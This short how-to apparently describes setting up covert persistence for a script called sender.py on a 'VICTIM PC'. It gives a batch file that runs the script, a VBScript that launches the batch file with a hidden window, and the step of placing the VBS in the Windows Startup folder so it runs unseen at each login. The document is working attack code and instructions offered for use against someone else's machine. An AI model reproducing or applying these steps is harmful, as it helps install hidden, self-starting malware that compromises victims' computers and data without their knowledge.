In VICTIM PC:

first put our script safely at nonvisible location
and create bat file that runs our script

@echo off
python3 sender.py



then create vbs script with the bat file path 


Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\Batch Files\syncfiles.bat" & Chr(34), 0
Set WshShell = Nothing



Note: Replace the batch file name/path accordingly in the script according to your requirement.

Save the file with .VBS extension, say launch_bat.vbs
Edit the .BAT file name and path accordingly, and save the file.
vbs uses to hide the command prompt and run invisibly
put vbs in appdata/roaming/microsoft/windows/start/programs/start
